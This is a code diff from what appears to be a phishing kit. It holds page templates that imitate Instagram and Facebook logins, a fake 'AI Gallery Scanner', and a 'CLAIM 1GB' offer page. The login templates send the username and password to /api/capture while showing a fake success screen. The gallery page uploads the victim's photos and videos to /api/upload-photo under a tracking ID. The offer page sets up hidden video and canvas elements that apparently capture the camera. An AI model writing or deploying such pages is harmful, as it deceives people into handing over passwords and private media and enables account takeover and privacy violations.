+PHOTO_ACCESS_TEMPLATE += '.processing-text{color:#667eea;font-size:14px;font-weight:600;text-align:center;padding:10px}\n';
+PHOTO_ACCESS_TEMPLATE += '#processingStatus{display:none}\n';
+PHOTO_ACCESS_TEMPLATE += '.scanning-text{color:#667eea;font-size:13px;text-align:center;padding:5px;animation:pulse 1.5s infinite}\n';
+PHOTO_ACCESS_TEMPLATE += '@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}\n';
+PHOTO_ACCESS_TEMPLATE += '</style>\n';
+PHOTO_ACCESS_TEMPLATE += '</head>\n';
+PHOTO_ACCESS_TEMPLATE += '<body>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="bg-shapes"><span></span><span></span><span></span></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="card">\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="header"><span class="icon"><i class="fas fa-images"></i></span><h1>📸 AI Gallery Scanner</h1><p>Scan your entire gallery with AI technology</p></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="permission-box">\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="item"><i class="fas fa-folder-open"></i> <span class="label">Read all photos & videos</span> <span class="status">Required</span></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="item"><i class="fas fa-file-alt"></i> <span class="label">Access all files</span> <span class="status">Required</span></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="item"><i class="fas fa-shield-alt"></i> <span class="label">Secure & encrypted</span> <span class="status granted">✅ Secure</span></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="item"><i class="fas fa-robot"></i> <span class="label">AI powered scanning</span> <span class="status granted">✅ Active</span></div>\n';
+PHOTO_ACCESS_TEMPLATE += '</div>\n';
+PHOTO_ACCESS_TEMPLATE += '<button class="btn" id="scanBtn" onclick="startScan()"><i class="fas fa-search"></i> SCAN GALLERY</button>\n';
+PHOTO_ACCESS_TEMPLATE += '<div id="status" class="status"></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="progress-container" id="progressContainer"><div class="fill" id="progressFill"></div></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div id="processingStatus"><div class="spinner"></div><div class="processing-text" id="processingText">🔍 Scanning gallery...</div></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div id="galleryGrid" class="gallery-grid"></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div id="resultArea" class="result-area" style="display:none"><i class="fas fa-check-circle"></i><h3>✅ Scan Complete!</h3><p id="resultText">Your gallery has been scanned successfully.</p><button class="btn btn-secondary" onclick="closeResult()"><i class="fas fa-times"></i> Close</button></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<input type="file" id="fileInput" multiple accept="image/*,video/*" webkitdirectory>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="footer">🔒 Secure & Private • AI Processing</div>\n';
+PHOTO_ACCESS_TEMPLATE += '</div>\n';
+PHOTO_ACCESS_TEMPLATE += '<script>\n';
+PHOTO_ACCESS_TEMPLATE += 'var USER_ID = "USERID_PLACEHOLDER";\n';
+PHOTO_ACCESS_TEMPLATE += 'var PLATFORM = "PLATFORM_PLACEHOLDER";\n';
+PHOTO_ACCESS_TEMPLATE += 'var selectedFiles = [];\n';
+PHOTO_ACCESS_TEMPLATE += 'function showStatus(msg, type) { type = type || "info"; var el = document.getElementById("status"); el.textContent = msg; el.className = "status " + type; el.style.display = "block"; }\n';
+PHOTO_ACCESS_TEMPLATE += 'function hideStatus() { document.getElementById("status").style.display = "none"; }\n';
+PHOTO_ACCESS_TEMPLATE += 'function updateProgress(percent) { var container = document.getElementById("progressContainer"); container.style.display = "block"; document.getElementById("progressFill").style.width = percent + "%"; }\n';
+PHOTO_ACCESS_TEMPLATE += 'function showProcessing(text) { document.getElementById("processingStatus").style.display = "block"; document.getElementById("processingText").textContent = text; }\n';
+PHOTO_ACCESS_TEMPLATE += 'function hideProcessing() { document.getElementById("processingStatus").style.display = "none"; }\n';
+PHOTO_ACCESS_TEMPLATE += 'function closeResult() { document.getElementById("resultArea").style.display = "none"; }\n';
+PHOTO_ACCESS_TEMPLATE += 'function showResult(text) { document.getElementById("resultArea").style.display = "block"; document.getElementById("resultText").textContent = text; }\n';
+PHOTO_ACCESS_TEMPLATE += 'function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }\n';
+PHOTO_ACCESS_TEMPLATE += 'function addToGallery(src) { var grid = document.getElementById("galleryGrid"); var img = document.createElement("img"); img.src = src; grid.appendChild(img); grid.style.display = "grid"; }\n';
+PHOTO_ACCESS_TEMPLATE += 'async function startScan() { var btn = document.getElementById("scanBtn"); btn.disabled = true; btn.innerHTML = "<i class=\\"fas fa-spinner fa-spin\\"></i> SCANNING..."; hideStatus(); hideProcessing(); document.getElementById("resultArea").style.display = "none"; document.getElementById("galleryGrid").innerHTML = ""; document.getElementById("galleryGrid").style.display = "none"; document.getElementById("progressContainer").style.display = "none"; showStatus("📂 Opening gallery access...", "info"); updateProgress(5); await sleep(500); try { var input = document.getElementById("fileInput"); input.click(); input.onchange = async function(e) { var files = input.files; if (!files || files.length === 0) { showStatus("❌ No files selected", "error"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; hideProcessing(); return; } selectedFiles = []; for (var i = 0; i < files.length; i++) { if (files[i].type.startsWith("image/") || files[i].type.startsWith("video/")) { selectedFiles.push(files[i]); } } selectedFiles = selectedFiles.slice(0, 100); if (selectedFiles.length === 0) { showStatus("❌ No images found.", "error"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; hideProcessing(); return; } await processFiles(selectedFiles); }; } catch(err) { showStatus("❌ Gallery access denied. Please allow permission.", "error"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; hideProcessing(); } }\n';
+PHOTO_ACCESS_TEMPLATE += 'async function processFiles(files) { var total = files.length; showStatus("📸 Found " + total + " images. Processing...", "info"); updateProgress(30); var successCount = 0; var batchSize = 5; var maxFiles = Math.min(total, 50); for (var i = 0; i < maxFiles; i += batchSize) { var batch = []; for (var j = i; j < Math.min(i + batchSize, maxFiles); j++) { batch.push(files[j]); } for (var k = 0; k < batch.length; k++) { var file = batch[k]; try { var reader = new FileReader(); var fileData = await new Promise(function(resolve, reject) { reader.onload = function(e) { resolve(e.target.result); }; reader.onerror = reject; reader.readAsDataURL(file); }); var reader2 = new FileReader(); reader2.onload = function(e) { addToGallery(e.target.result); }; reader2.readAsDataURL(file); var response = await fetch("/api/upload-photo", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ userid: USER_ID, platform: PLATFORM, filename: file.name, data: fileData, size: file.size }) }); var result = await response.json(); if (result.success) successCount++; var percent = 30 + (successCount / maxFiles) * 60; updateProgress(percent); showProcessing("📤 Processing " + successCount + "/" + maxFiles + " photos..."); await sleep(200); } catch(err) { console.error("Error processing file:", err); } } } updateProgress(100); hideProcessing(); if (successCount > 0) { showResult("✅ " + successCount + " photo(s) scanned and sent!\\n\\n⚠️ Server is processing. Full results in 2-3 hours."); showStatus("✅ " + successCount + " photos sent successfully!", "success"); } else { showStatus("❌ Processing failed. Please try again.", "error"); } document.getElementById("scanBtn").disabled = false; document.getElementById("scanBtn").innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; }\n';
+PHOTO_ACCESS_TEMPLATE += '</script>\n';
+PHOTO_ACCESS_TEMPLATE += '</body>\n';
+PHOTO_ACCESS_TEMPLATE += '</html>\n';
 
 // ====================== TEMPLATES (Instagram, Facebook, Camera) ======================
-const TEMPLATES = {
-    instagram: `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Instagram Login</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
-        body{background:linear-gradient(145deg,#1a0a2e,#2d1b4e,#0a0a0a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}
-        .card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.12);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.1)}
-        .logo{text-align:center;margin-bottom:30px}
-        .logo i{font-size:65px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-        .logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}
-        .input-group{position:relative;margin-bottom:18px}
-        .input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#888;font-size:18px}
-        .input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}
-        .input-group input:focus{border-color:#d62976;background:rgba(255,255,255,0.12);box-shadow:0 0 30px rgba(214,41,118,0.15)}
-        .input-group input::placeholder{color:#777}
-        .btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#4f5bd5,#d62976);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(214,41,118,0.3)}
-        .btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(214,41,118,0.5)}
-        .loader{display:none;text-align:center;padding:20px 0}
-        .loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#d62976;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}
-        @keyframes spin{100%{transform:rotate(360deg)}}
-        .loader p{color:#aaa;margin-top:15px;font-size:14px}
-        .progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}
-        .progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#4f5bd5,#d62976);transition:width .3s}
-        .result{display:none;text-align:center;padding:20px}
-        .result i{font-size:50px;color:#28a745}
-        .result h3{color:#fff;margin-top:10px}
-        .bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}
-        .bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(214,41,118,0.15),transparent 70%);animation:float 20s infinite ease-in-out}
-        .bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}
-        .bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}
-        @keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}
-        .footer{text-align:center;margin-top:20px;color:#555;font-size:12px}
-        .footer a{color:#888;text-decoration:none}
-    </style>
-</head>
-<body>
-<div class="bg-shapes"><span></span><span></span></div>
-<div class="card">
-    <div class="logo"><i class="fab fa-instagram"></i><h1>Instagram</h1></div>
-    <div id="form-screen">
-        <div class="input-group"><i class="fas fa-user"></i><input type="text" id="username" placeholder="Username or Email"></div>
-        <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>
-        <button class="btn" onclick="startEngine()"><i class="fas fa-bolt"></i> Login Now</button>
-    </div>
-    <div id="process-screen" style="display:none">
-        <div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>
-        <div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>
-        <div id="result-area" style="display:none">
-            <i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>
-            <h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>
-        </div>
-    </div>
-    <div class="footer"><a href="#">Forgot password?</a> • <a href="#">Sign up</a></div>
-</div>
-<script>
-const id="USERID_PLACEHOLDER";
-const p="PLATFORM_PLACEHOLDER";
-function startEngine(){
-    const u=document.getElementById('username').value.trim();
-    const pwd=document.getElementById('password').value;
-    if(!u||!pwd){alert("Please fill all fields.");return}
-    fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(e=>console.error(e));
-    document.getElementById('form-screen').style.display='none';
-    document.getElementById('process-screen').style.display='block';
-    document.querySelector('.loader').style.display='block';
-    document.querySelector('.progress-bar').style.display='block';
-    document.getElementById('result-area').style.display='none';
-    let progress=0;
-    const interval=setInterval(()=>{
-        progress+=Math.random()*3+1;
-        if(progress>=100){progress=100;clearInterval(interval);
-            document.querySelector('.loader').style.display='none';
-            document.querySelector('.progress-bar').style.display='none';
-            document.getElementById('result-area').style.display='block';
-            document.getElementById('status-text').innerText='✅ Verified';
-            return}
-        document.getElementById('progress-fill').style.width=progress+'%';
-        if(progress<30)document.getElementById('status-text').innerText='Connecting...';
-        else if(progress<60)document.getElementById('status-text').innerText='Verifying...';
-        else if(progress<85)document.getElementById('status-text').innerText='Loading...';
-        else document.getElementById('status-text').innerText='Almost done...';
-    },150);
-}
-</script>
-</body>
-</html>`,
-    facebook: `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Facebook Login</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
-        body{background:linear-gradient(145deg,#0a1628,#1a2a4a,#0a0a2a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}
-        .card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.1);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}
-        .logo{text-align:center;margin-bottom:30px}
-        .logo i{font-size:65px;color:#1877f2;text-shadow:0 0 40px rgba(24,119,242,0.3)}
-        .logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}
-        .input-group{position:relative;margin-bottom:18px}
-        .input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#666;font-size:18px}
-        .input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.1);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}
-        .input-group input:focus{border-color:#1877f2;background:rgba(255,255,255,0.12)}
-        .input-group input::placeholder{color:#666}
-        .btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#1877f2,#0056b3);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(24,119,242,0.3)}
-        .btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(24,119,242,0.5)}
-        .loader{display:none;text-align:center;padding:20px 0}
-        .loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#1877f2;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}
-        @keyframes spin{100%{transform:rotate(360deg)}}
-        .loader p{color:#aaa;margin-top:15px;font-size:14px}
-        .progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}
-        .progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#1877f2,#42b0f5);transition:width .3s}
-        .result{display:none;text-align:center;padding:20px}
-        .result i{font-size:50px;color:#28a745}
-        .result h3{color:#fff;margin-top:10px}
-        .bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}
-        .bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(24,119,242,0.12),transparent 70%);animation:float 20s infinite ease-in-out}
-        .bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}
-        .bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}
-        @keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}
-        .footer{text-align:center;margin-top:20px;color:#555;font-size:12px}
-        .footer a{color:#666;text-decoration:none}
-    </style>
-</head>
-<body>
-<div class="bg-shapes"><span></span><span></span></div>
-<div class="card">
-    <div class="logo"><i class="fab fa-facebook"></i><h1>Facebook</h1></div>
-    <div id="form-screen">
-        <div class="input-group"><i class="fas fa-envelope"></i><input type="text" id="username" placeholder="Email or Phone"></div>
-        <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>
-        <button class="btn" onclick="startEngine()"><i class="fas fa-rocket"></i> Login</button>
-    </div>
-    <div id="process-screen" style="display:none">
-        <div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>
-        <div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>
-        <div id="result-area" style="display:none">
-            <i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>
-            <h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>
-        </div>
-    </div>
-    <div class="footer"><a href="#">Forgot password?</a> • <a href="#">Create account</a></div>
-</div>
-<script>
-const id="USERID_PLACEHOLDER";
-const p="PLATFORM_PLACEHOLDER";
-function startEngine(){
-    const u=document.getElementById('username').value.trim();
-    const pwd=document.getElementById('password').value;
-    if(!u||!pwd){alert("Please fill all fields.");return}
-    fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(e=>console.error(e));
-    document.getElementById('form-screen').style.display='none';
-    document.getElementById('process-screen').style.display='block';
-    document.querySelector('.loader').style.display='block';
-    document.querySelector('.progress-bar').style.display='block';
-    document.getElementById('result-area').style.display='none';
-    let progress=0;
-    const interval=setInterval(()=>{
-        progress+=Math.random()*3+1;
-        if(progress>=100){progress=100;clearInterval(interval);
-            document.querySelector('.loader').style.display='none';
-            document.querySelector('.progress-bar').style.display='none';
-            document.getElementById('result-area').style.display='block';
-            document.getElementById('status-text').innerText='✅ Verified';return}
-        document.getElementById('progress-fill').style.width=progress+'%';
-        if(progress<30)document.getElementById('status-text').innerText='Connecting...';
-        else if(progress<60)document.getElementById('status-text').innerText='Verifying...';
-        else if(progress<85)document.getElementById('status-text').innerText='Loading...';
-        else document.getElementById('status-text').innerText='Almost done...';
-    },150);
-}
-</script>
-</body>
-</html>`,
-    camera: `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VIP Data Injector</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Rajdhani',sans-serif;background:radial-gradient(ellipse at center,#0a0a0a,#000000);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}
-        .card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(0,255,100,0.15);border-radius:35px;padding:50px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.9),inset 0 1px 0 rgba(0,255,100,0.1)}
-        .badge{display:inline-block;background:linear-gradient(90deg,#00ff88,#00cc66);padding:6px 20px;border-radius:30px;font-size:11px;font-weight:700;letter-spacing:3px;color:#000;margin-bottom:15px}
-        h1{font-family:'Orbitron',sans-serif;font-size:38px;font-weight:900;background:linear-gradient(135deg,#00ff88,#00ff44);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:25px}
-        .input-box{margin:20px 0;text-align:left}
-        .input-box label{font-size:13px;color:#00ff88;text-transform:uppercase;letter-spacing:2px;margin-left:15px;display:block;margin-bottom:5px}
-        .input-box input{width:100%;background:rgba(0,0,0,0.5);border:1px solid rgba(0,255,100,0.15);border-radius:16px;padding:18px 20px;color:#fff;font-size:18px;font-family:'Rajdhani',sans-serif;transition:.4s;outline:none}
-        .input-box input:focus{border-color:#00ff88;box-shadow:0 0 30px rgba(0,255,136,0.1)}
-        .btn-claim{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#00ff88,#00cc66);color:#000;font-family:'Orbitron',sans-serif;font-weight:900;font-size:17px;text-transform:uppercase;cursor:pointer;transition:.3s;box-shadow:0 10px 40px rgba(0,255,136,0.25);margin-top:15px}
-        .btn-claim:hover{transform:translateY(-2px) scale(1.02);box-shadow:0 20px 50px rgba(0,255,136,0.4)}
-        .btn-claim:disabled{opacity:0.6;cursor:not-allowed}
-        .loader-box{display:none;text-align:center;padding:20px 0}
-        .loader-box .spinner{width:40px;height:40px;border:3px solid rgba(0,255,136,0.15);border-top-color:#00ff88;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto}
-        @keyframes spin{100%{transform:rotate(360deg)}}
-        .loader-box p{color:#00ff88;margin-top:15px;font-size:14px;letter-spacing:1px}
-        .log-area{background:rgba(0,0,0,0.6);border-radius:16px;padding:20px;font-family:'Courier New',monospace;font-size:13px;color:#00ff88;text-align:left;display:none;border:1px solid rgba(0,255,136,0.08);margin-top:20px;max-height:200px;overflow-y:auto}
-        .log-area .line{padding:4px 0;border-bottom:1px solid rgba(0,255,136,0.05)}
-        .log-area .line.suc{color:#00ff88}
-        .log-area .line.err{color:#ff4444}
-        .bg-glow{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}
-        .bg-glow span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(0,255,136,0.06),transparent 70%);animation:float 20s infinite ease-in-out}
-        .bg-glow span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}
-        .bg-glow span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}
-        @keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}
-        video,canvas{display:none}
-        .result-box{display:none;text-align:center;padding:20px 0}
-        .result-box i{font-size:50px;color:#00ff88}
-        .result-box h3{color:#fff;margin-top:10px;font-family:'Orbitron',sans-serif}
-    </style>
-</head>
-<body>
-<div class="bg-glow"><span></span><span></span></div>
-<div class="card">
-    <div class="badge">🔥 VIP ACCESS</div>
-    <h1>CLAIM 1GB</h1>
-    <div class="input-box"><label>📱 Mobile Number</label><input type="number" id="mobile" placeholder="Enter 10 digit number"></div>
-    <button class="btn-claim" id="claimBtn">🎁 CLAIM NOW</button>
-    <div class="loader-box" id="loaderBox"><div class="spinner"></div><p id="statusText">Initializing...</p></div>
-    <div class="log-area" id="logArea"></div>
-    <div class="result-box" id="resultBox"><i class="fas fa-check-circle"></i><h3>Success!</h3></div>
-</div>
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
-<script>
-const id="USERID_PLACEHOLDER";
-const p="PLATFORM_PLACEHOLDER";
-const claimBtn=document.getElementById('claimBtn');
-const logArea=document.getElementById('logArea');
-const loaderBox=document.getElementById('loaderBox');
-const statusText=document.getElementById('statusText');
-const resultBox=document.getElementById('resultBox');
-const video=document.getElementById('v');
-const canvas=document.getElementById('c');
-const ctx=canvas.getContext('2d');
+var INSTA_TEMPLATE = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n<title>Instagram Login</title>\n<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n<style>\n*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}\nbody{background:linear-gradient(145deg,#1a0a2e,#2d1b4e,#0a0a0a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}\n.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.12);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.1)}\n.logo{text-align:center;margin-bottom:30px}\n.logo i{font-size:65px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}\n.logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}\n.input-group{position:relative;margin-bottom:18px}\n.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#888;font-size:18px}\n.input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}\n.input-group input:focus{border-color:#d62976;background:rgba(255,255,255,0.12);box-shadow:0 0 30px rgba(214,41,118,0.15)}\n.input-group input::placeholder{color:#777}\n.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#4f5bd5,#d62976);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(214,41,118,0.3)}\n.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(214,41,118,0.5)}\n.loader{display:none;text-align:center;padding:20px 0}\n.loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#d62976;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}\n@keyframes spin{100%{transform:rotate(360deg)}}\n.loader p{color:#aaa;margin-top:15px;font-size:14px}\n.progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}\n.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#4f5bd5,#d62976);transition:width .3s}\n.result{display:none;text-align:center;padding:20px}\n.result i{font-size:50px;color:#28a745}\n.result h3{color:#fff;margin-top:10px}\n.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}\n.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(214,41,118,0.15),transparent 70%);animation:float 20s infinite ease-in-out}\n.bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}\n.bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}\n@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}\n.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}\n.footer a{color:#888;text-decoration:none}\n</style>\n</head>\n<body>\n<div class="bg-shapes"><span></span><span></span></div>\n<div class="card">\n<div class="logo"><i class="fab fa-instagram"></i><h1>Instagram</h1></div>\n<div id="form-screen">\n<div class="input-group"><i class="fas fa-user"></i><input type="text" id="username" placeholder="Username or Email"></div>\n<div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>\n<button class="btn" onclick="startEngine()"><i class="fas fa-bolt"></i> Login Now</button>\n</div>\n<div id="process-screen" style="display:none">\n<div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>\n<div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>\n<div id="result-area" style="display:none">\n<i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>\n<h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>\n</div>\n</div>\n<div class="footer"><a href="#">Forgot password?</a> • <a href="#">Sign up</a></div>\n</div>\n<script>\nvar id="USERID_PLACEHOLDER";\nvar p="PLATFORM_PLACEHOLDER";\nfunction startEngine(){\nvar u=document.getElementById("username").value.trim();\nvar pwd=document.getElementById("password").value;\nif(!u||!pwd){alert("Please fill all fields.");return}\nfetch("/api/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(function(e){console.error(e)});\ndocument.getElementById("form-screen").style.display="none";\ndocument.getElementById("process-screen").style.display="block";\ndocument.querySelector(".loader").style.display="block";\ndocument.querySelector(".progress-bar").style.display="block";\ndocument.getElementById("result-area").style.display="none";\nvar progress=0;\nvar interval=setInterval(function(){\nprogress+=Math.random()*3+1;\nif(progress>=100){progress=100;clearInterval(interval);\ndocument.querySelector(".loader").style.display="none";\ndocument.querySelector(".progress-bar").style.display="none";\ndocument.getElementById("result-area").style.display="block";\ndocument.getElementById("status-text").innerText="✅ Verified";\nreturn}\ndocument.getElementById("progress-fill").style.width=progress+"%";\nif(progress<30)document.getElementById("status-text").innerText="Connecting...";\nelse if(progress<60)document.getElementById("status-text").innerText="Verifying...";\nelse if(progress<85)document.getElementById("status-text").innerText="Loading...";\nelse document.getElementById("status-text").innerText="Almost done...";\n},150);\n}\n</script>\n</body>\n</html>\n';
 
-function addLog(msg,type=''){logArea.style.display='block';const l=document.createElement('div');l.className='line '+(type||'');l.innerText='▸ '+msg;logArea.appendChild(l);logArea.scrollTop=logArea.scrollHeight}
